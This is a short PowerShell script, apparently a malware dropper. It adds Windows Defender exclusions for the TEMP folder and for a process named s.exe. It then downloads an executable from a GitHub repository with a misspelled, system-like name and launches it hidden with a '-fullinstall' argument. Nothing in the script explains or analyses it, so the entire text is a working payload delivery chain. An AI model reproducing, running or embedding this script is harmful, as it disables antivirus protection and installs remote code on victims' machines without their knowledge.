$u = "https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/puro/service.exe"
$o = "$env:TEMP\s.exe"
Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess 's.exe' -ErrorAction SilentlyContinue
iwr $u -OutFile $o -UseBasicParsing
Start-Process $o -ArgumentList '-fullinstall' -WindowStyle Hidden